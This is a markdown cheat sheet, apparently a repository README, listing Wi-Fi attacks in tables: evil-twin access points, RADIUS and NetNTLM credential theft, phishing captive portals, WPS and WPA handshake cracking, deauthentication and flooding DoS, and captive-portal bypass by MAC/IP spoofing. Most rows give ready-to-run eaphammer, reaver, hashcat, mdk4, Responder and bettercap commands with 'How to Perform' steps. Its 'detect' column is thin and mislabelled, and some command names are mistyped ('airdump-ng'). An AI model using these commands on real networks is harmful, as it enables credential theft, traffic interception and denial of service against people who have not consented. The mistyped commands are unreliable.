# Wifi-Security-Vulnerabilities

Here is the updated table with columns for how to perform the attack and how to detect if the attack is successful:

### Rogue AP / Evil Twin Attacks

| Attack Surface | Attack Vector | Description | Techniques Used | How to Perform | How to Detect If Successful |
|----------------|---------------|-------------|-----------------|----------------|----------------------------|
| Basic Open Hotspot | Open Network | Setting up a basic open hotspot for unauthorized access | `berate_ap <interface_AP> <interface_internet> <SSID>` | Set up a simple open AP with internet access using the `berate_ap` command. | Monitor for unexpected open networks and unauthorized connections. |
| Open Network Evil Twin | Open Network | Setting up an Evil Twin AP on an open network to intercept traffic | Tools: <br> - `airgeddon.sh` <br> - `fluxion.sh` <br> - `wifipumpkin3` <br> - `eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID>` | Use tools like `airgeddon.sh`, `fluxion.sh`, or `wifipumpkin3` to create an Evil Twin AP with the same SSID as a legitimate one. | Detect multiple APs with the same SSID but different MAC addresses. Monitor for abnormal traffic patterns. |
| WPA/WPA2-Personal Evil Twin | Known WPA Passphrase | Cloning a WPA/WPA2 AP with a known passphrase to trick users into connecting | `eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase <passphrase>` | Use `eaphammer` to set up an Evil Twin AP with the known WPA passphrase. | Monitor for unexpected WPA/WPA2 APs and unauthorized connections. |
| WPA/WPA2-Personal Evil Twin | Unknown WPA Passphrase | Capturing WPA handshake and performing a phishing attack to retrieve the passphrase | `eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk --essid <SSID> --wpa-passphrase randompassphrase --capture-wpa-handshake` | Use `eaphammer` to capture WPA handshakes and conduct phishing attacks to obtain the passphrase. | Detect WPA handshake capture attempts and analyze for phishing attempts. Monitor for unauthorized network access. |
| WPA/WPA2-Enterprise Evil Twin | Unknown RADIUS Credentials | Setting up an Evil Twin AP to steal RADIUS credentials using a certificate wizard | `eaphammer --cert-wizard` <br> `eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID> --creds` | Use `eaphammer --cert-wizard` to generate certificates and set up the Evil Twin AP to capture RADIUS credentials. | Monitor for unexpected RADIUS requests and unusual certificate activity. |
| WPA/WPA2-Enterprise Evil Twin | Known RADIUS Credentials | Cloning a WPA/WPA2-Enterprise AP to intercept RADIUS credentials | `berate_ap --eap --mana-wpe --wpa-sycophant --mana-credcut <file_captured_creds> <interface_AP> <interface_internet> <SSID>` <br> `wpa_sycophant.sh -c wpa_sycophant.example.conf -i <interface>` <br> `eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID_corporate_wifi>` | Use `berate_ap`, `wpa_sycophant`, and `eaphammer` to set up an Evil Twin AP and intercept credentials. | Detect unauthorized RADIUS servers and monitor RADIUS traffic for anomalies. |
| RADIUS Credential Stealing | EAP (MSCHAPv2) Relay | Using a relay attack to steal RADIUS credentials | `ehdb --add --identity <username> --password <password>` <br> `ehdb --add --identity <username> --nt-hash <ntlm_hash>` <br> `eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap --essid <SSID_corporate_wifi>` | Use `ehdb` and `eaphammer` to perform a relay attack and steal RADIUS credentials. | Monitor for unusual RADIUS traffic and unauthorized RADIUS credential usage. |
| 802.11 Network Selection Algorithms Abuse | KARMA Attack (outdated) | Abusing network selection algorithms to force clients to connect to a rogue AP | `By default with wifiphisher` | Use `wifiphisher` with default settings to perform a KARMA attack. | Detect multiple SSID broadcasts and monitor for unexpected client connections. |
| 802.11 Network Selection Algorithms Abuse | MANA Attack (KARMA improvement) | Improved version of KARMA attack to force client connections | `Add --mana option in eaphammer command` | Add the `--mana` option in `eaphammer` to perform a MANA attack. | Monitor for multiple SSID broadcasts and client connections to rogue APs. |
| 802.11 Network Selection Algorithms Abuse | Loud MANA (MANA Improvement) | Enhanced MANA attack for more aggressive client connections | `Add --mana --loud in eaphammer command` | Add `--mana --loud` options in `eaphammer` to perform a loud MANA attack. | Detect excessive SSID broadcasts and monitor for client connections to rogue APs. |
| 802.11 Network Selection Algorithms Abuse | Known Beacons Attack | Using known beacons to trick clients into connecting to a rogue AP | `Add --mana --known-beacons in eaphammer command` | Add `--mana --known-beacons` options in `eaphammer` to perform a known beacons attack. | Monitor for unusual beacon frames and unauthorized client connections. |

### Clients Attacks

| Attack Surface                  | Attack Vector                               | Description                                                                       | Techniques Used                                                                                                                                     | How to Perform                                                                                                                     | How to Detect If Successful                                             |
|---------------------------------|---------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------|
| Standard Man-in-the-Middle Attacks | ARP Spoofing                                | Spoofing ARP messages to intercept or redirect traffic                            | `Bettercap > arp.spoof module`                                                                                                                      | Use Bettercap's `arp.spoof` module to perform ARP spoofing attacks.                                                              | Monitor for ARP cache anomalies and unexpected traffic redirection.    |
| Standard Man-in-the-Middle Attacks | DNS Spoofing                                | Spoofing DNS responses to redirect traffic                                        | `Bettercap > dns.spoof module`                                                                                                                      | Use Bettercap's `dns.spoof` module to intercept and modify DNS responses.                                                         | Detect DNS request-response anomalies and monitor for unexpected redirects. |
| Standard Man-in-the-Middle Attacks | Credentials Sniffing                        | Sniffing network traffic to capture credentials                                   | `Bettercap > net.sniff module` <br> `Pcredz -i <interface> -v` <br> `python net-creds.py -i <interface>` <br> `dsniff -i <interface>`               | Use tools like Bettercap, Pcredz, net-creds, or dsniff to capture credentials from network traffic.                              | Monitor for unexpected traffic patterns and analyze for credential capture attempts.  |
| Standard Man-in-the-Middle Attacks | JS Injection                                | Injecting malicious JavaScript into web pages                                     | `Bettercap > caplet beef-active`                                                                                                                   | Use Bettercap's `beef-active` caplet to inject JavaScript into web traffic.                                                       | Detect unexpected JavaScript in web pages and monitor for abnormal browser behavior.   |
| Captive Portal Attack           | Phishing (Social Engineering)                | Creating a fake login page to capture user credentials                            | `wifiphisher -aI <interface_rogue_AP> -eI <interface_deauthenticating> -iI <internet_interface> -p firmware-upgrade --handshake-capture handshake.pcap --essid <target_SSID> -kN` <br> `wifipumpkin3 --xplugin "set interface wlan0; set ssid <SSID>; set proxy captiveflask; start"` <br> `Add --captive-portal in eaphammer command` <br> `airgeddon.sh` <br> `fluxion.sh` | Use tools like wifiphisher, wifipumpkin3, airgeddon, and fluxion to create a fake captive portal.                               | Monitor for unauthorized captive portals and analyze network for phishing attempts.        |
| Captive Portal Attack           | Payload Delivery                             | Delivering malicious payloads through a captive portal                            | `wifiphisher -aI <interface_rogue_AP> -jI <interface_jamming> -p plugin.update --handshake-capture handshake.pcap -kN`                                | Use wifiphisher to deliver payloads through a fake captive portal.                                                                | Detect and analyze traffic patterns indicative of payload delivery attempts.  |
| NetNTLM Hash Stealing           | Hostile Portal Attack (Redirect to SMB)      | Redirecting traffic to steal NetNTLM hashes                                       | `Add --hostile-portal in eaphammer command`                                                                                                         | Use eaphammer with the `--hostile-portal` option to redirect traffic and steal NetNTLM hashes.                                   | Monitor for unexpected SMB traffic and analyze for hash capture attempts. |
| NetNTLM Hash Stealing           | NBT-NS/LLMNR Poisoning                       | Poisoning name resolution protocols to capture NetNTLM hashes                     | `Responder.py -I <interface> -wrf`                                                                                                                  | Use Responder to poison NBT-NS and LLMNR responses and capture NetNTLM hashes.                                                   | Detect poisoned name resolution responses and monitor for unusual SMB traffic. |
| Passive Sniffing                | Traffic Decryption                           | Decrypting captured traffic                                                       | `Wireshark (requires PSK or PMK)` <br> `airdecap-ng -e <SSID> -p <passphrase> <capture.pcap>`                                                      | Use Wireshark or airdecap-ng with the appropriate keys to decrypt captured traffic.                                              | Analyze network traffic for signs of decryption and monitor for unauthorized traffic capture. |


### Authentication Cracking

| Attack Surface                  | Attack Vector                                     | Description                                                                                | Techniques Used                                                                                                                                | How to Perform                                                                                                                     | How to Detect If Successful                                             |
|---------------------------------|---------------------------------------------------|--------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------|
| WEP                             | Obsolete Protocol                                 | Cracking WEP encryption using various attack methods                                       | `wifite`, `airgeddon.sh`                                                                                                                       | Use tools like `wifite` or `airgeddon.sh` which encompass multiple WEP attack techniques.                                           | Monitor for unauthorized decryption attempts and weak encryption use.   |
| WPA/WPA2-Personal (PSK)         | WPS PIN Attack                                    | Brute forcing WPS PIN to retrieve WPA/WPA2 PSK                                             | `reaver -i mon0 -b <MAC_AP> -c <channel> -f -N [-L -d 2] -vv` <br> `bully mon0 -b <MAC_AP> -c <channel> -S -F -B -v 3`                         | Use tools like `reaver` or `bully` to perform WPS PIN brute force attacks.                                                         | Detect multiple failed WPS attempts and monitor for unauthorized access attempts.  |
| WPA/WPA2-Personal (PSK)         | WPS Pixie Dust Attack (offline)                    | Exploiting offline vulnerability in WPS to retrieve WPA/WPA2 PSK                           | `reaver -i mon0 -b <MAC_AP> -c <channel> -K -N -vv` <br> `bully mon0 -b <MAC_AP> -d -v 3`                                                      | Use tools like `reaver` or `bully` to perform offline WPS Pixie Dust attacks.                                                      | Detect attempts to exploit WPS vulnerabilities and monitor for unauthorized access.   |
| WPA/WPA2-Personal (PSK)         | Null PIN Attack                                   | Using a null PIN to bypass WPS and retrieve WPA/WPA2 PSK                                   | `reaver -i mon0 -b <MAC_AP> -c <channel> -f -N -g 1 -vv -p ""`                                                                                | Use `reaver` to perform null PIN attacks.                                                                                          | Monitor for WPS null PIN attempts and analyze access logs.               |
| WPA/WPA2-Personal (PSK)         | PMKID Capture (client-less) & Cracking            | Capturing PMKID to crack WPA/WPA2 PSK without client interaction                           | `hcxdumptool -i mon0 -o capture.pcapng --enable_status=1 -c <channel>` <br> `hcxpcaptool -E essidlist -I identitylist -U usernamelist -z capture.16800 capture.pcapng` <br> `hashcat -m 16800 capture.16800 -a 0 -w 4 <wordlist>` | Use `hcxdumptool` and `hcxpcaptool` to capture PMKID and `hashcat` for cracking.                                                   | Detect capture attempts and analyze for unusual PMKID activity.          |
| WPA/WPA2-Personal (PSK)         | Handshake Capture (req. client) & Cracking        | Capturing WPA/WPA2 handshake and cracking it                                               | `airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0` <br> `aircrack-ng -a 2 -b <AP_MAC> -w <wordlist> <capture>`                        | Use `airdump-ng` to capture handshake and `aircrack-ng` for cracking.                                                             | Monitor for handshake capture attempts and analyze access logs.          |
| WPA/WPA2-Enterprise (MGT)       | RADIUS Usernames Capture                          | Capturing RADIUS usernames during authentication                                           | `Wireshark > "Identity" field into EAP Message of type "Response, Identity"` <br> `python crEAP.py -i mon0 -c <channel>`                        | Use Wireshark or `crEAP.py` to capture RADIUS usernames.                                                                          | Monitor for RADIUS traffic anomalies and analyze identity field activity.|
| WPA/WPA2-Enterprise (MGT)       | RADIUS Accounts Bruteforce / Password Spraying    | Bruteforcing or spraying passwords on RADIUS accounts                                      | `eaphammer --eap-spray --interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \ --essid <targetESSID> --password <password_to_spray> --user-list <usernames_list>` | Use `eaphammer` to perform bruteforce or password spraying attacks on RADIUS accounts.                                             | Detect multiple failed authentication attempts and analyze for password spraying patterns.   |
| WPA/WPA2-Enterprise (MGT)       | LEAP & EAP-MD5 Handshake Capture & Cracking       | Capturing and cracking LEAP & EAP-MD5 handshakes                                           | `airdump-ng -c <channel> --bssid <AP_MAC> -w <capture> mon0` <br> `eapmd5pass -r <capture> -w <wordlist> # For EAP-MD5` <br> `asleap -r <capture> -W <wordlist> # For LEAP (crack MSCHAPv2 challenge/response)` | Use tools like `airdump-ng`, `eapmd5pass`, and `asleap` to capture and crack LEAP & EAP-MD5 handshakes.                           | Monitor for handshake capture attempts and analyze for cracking activity. |
| WPA/WPA2-Enterprise (MGT)       | MSCHAPv2 Challenge / Response Capture & Cracking  | Capturing and cracking MSCHAPv2 challenge/response via Rogue AP & Cracking                 | `asleap -C <mschapv2_challenge> -R <mschapv2_response> -W <wordlist>`                                                                           | Use `asleap` to capture and crack MSCHAPv2 challenge/response pairs.                                                               | Detect capture attempts and analyze for unauthorized challenge/response activity. |


### Denial of Service (DoS) Attacks

| Attack Surface                  | Attack Vector                                     | Description                                                                                | Techniques Used                                                                                                                                | How to Perform                                                                                                                     | How to Detect If Successful                                             |
|---------------------------------|---------------------------------------------------|--------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------|
| Disconnect clients from AP      | Deauthentication / Disassociation                 | Disconnecting clients from the Access Point (AP)                                            | `aireplay-ng --deauth 20 -c <MAC_target> -a <MAC_AP> mon0` <br> `mdk4 mon0 d -c <channel> -E <SSID>`                                            | Use `aireplay-ng` or `mdk4` to send deauthentication or disassociation packets.                                                   | Monitor for excessive deauthentication frames and client disconnections.|
| Generate many fake APs seen by clients | Beacon Flooding                                      | Creating many fake APs to confuse clients and crash network scanners                        | `mdk4 mon0 b -a -w nta -m`                                                                                                                     | Use `mdk4` to create fake APs through beacon flooding.                                                                            | Detect high numbers of fake APs and unusual beacon frames.               |
| Simulate many clients            | Authentication DoS                                | Overwhelming the AP with fake client authentication requests to freeze or reset it          | `mdk4 mon0 a -m -a <MAC_AP>`                                                                                                                   | Use `mdk4` to simulate many client authentication requests.                                                                     | Monitor for excessive authentication attempts and AP stability issues.  |
| Keep AP busy with fake sessions  | EAPOL Start Injection                             | Keeping the AP busy with fake sessions to disable handling of legitimate clients             | `mdk4 mon0 e -t <MAC_AP> -s`                                                                                                                   | Use `mdk4` to inject EAPOL Start frames.                                                                                         | Detect unusual EAPOL Start traffic and monitor AP for session handling issues.|
| Kick clients from AP             | EAPOL Logoff Injection                             | Forcing clients to log off from the AP                                                      | `mdk4 mon0 e -t <MAC_AP> -l`                                                                                                                   | Use `mdk4` to inject EAPOL Logoff frames.                                                                                        | Monitor for EAPOL Logoff frames and client logoff activity.             |


### Hotspot Captive Portal Bypass

| Attack Surface                  | Attack Vector                 | Description                                                                                                                                       | Techniques Used                                                                                                                               | How to Perform                                                                                                                 | How to Detect If Successful                                   |
|---------------------------------|-------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------|
| MAC-based Authorization         | MAC Spoofing                  | Changing the attacker's MAC address to that of an authorized client to bypass MAC-based authorization                                              | `ifconfig wlan0 hw ether <authorized_MAC_address>`                                                                                             | Use `ifconfig` to change the MAC address of the attacker's interface to match that of an authorized client.                 | Monitor for duplicate MAC addresses on the network.           |
| IP-based Authorization          | IP Spoofing                   | Spoofing the IP address of an authorized client and forwarding traffic to bypass IP-based authorization                                            | `echo 1 > /proc/sys/net/ipv4/ip_forward; ettercap -T -q -i wlan0 -w dump -M ARP /<IP_authorized_client>/ /<IP_gateway>/; iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <IP_authorized_client>; iptables -t mangle -A FORWARD -d <IP_authorized_client> -j TTL --ttl-inc 1;` | Enable IP forwarding and use `ettercap` to perform ARP spoofing, followed by setting up `iptables` rules for IP spoofing and forwarding. | Monitor for ARP spoofing attempts and unauthorized IP addresses. |
| MAC+IP-based Authorization      | MAC and IP Spoofing           | Combining MAC and IP spoofing to bypass both MAC-based and IP-based authorization methods                                                           | `modprobe bridge; brctl addbr br0; brctl addif br0 <interface>; ebtables -t nat -A POSTROUTING -o <interface> -d <MAC_gateway> -j snat --to-source <MAC_authorized_client>;` | Use `modprobe` and `brctl` to set up a bridge, followed by `ebtables` to perform MAC and IP spoofing.                        | Monitor for anomalies in MAC and IP pairs on the network.     |


### Monitoring

| Monitoring Technique          | Description                                                                                                            | Command(s) Used                                                                                                      |
|-------------------------------|------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------|
| Increase TX Power             | Increases the transmission power of the wireless card to extend range and improve signal strength                      | `iw reg set B0; iwconfig wlan0 txpower 30`                                                                           |
| Monitor 2.4GHz (w/ channel hopping) | Captures packets on the 2.4GHz band, hopping across channels for comprehensive monitoring                         | `airodump-ng mon0`                                                                                                   |
| Monitor 5GHz (w/ channel hopping) | Captures packets on the 5GHz band, hopping across channels for comprehensive monitoring                              | `airodump-ng --band a mon0`                                                                                          |
| Monitor specific Channel      | Captures packets on a specific channel                                                                                 | `airodump-ng -c <channel> mon0`                                                                                      |
| Monitor Clients on AP         | Monitors clients connected to a specific AP                                                                            | `airodump-ng -c <channel> --bssid <MAC_AP> -w <capture_file> mon0`                                                   |
| Find Hidden SSID              | Reveals hidden SSIDs by deauthenticating clients and capturing reauthentication packets                                | `airodump-ng -c <channel> --bssid <MAC_AP> mon0` <br> `aireplay-ng -0 20 -a <MAC_AP> mon0`                           |
| All-in-one w/ web UI          | Comprehensive monitoring with a web UI for easy access and visualization                                               | `kismet -c mon0`                                                                                                     |
| Generate Graph of Probe Requests of nearby Devices | Creates a graphical representation of probe requests from nearby devices                                         | `airodump-ng -r targetnet.pcap -w TARGETNET` <br> `airgraph-ng -i TARGETNET-01.csv -g CPG -o targetnet-pnl.png`       |
| Wardriving                    | Collects and logs details of wireless networks while moving through different locations                                | [https://wigle.net](https://wigle.net)                                                                               |

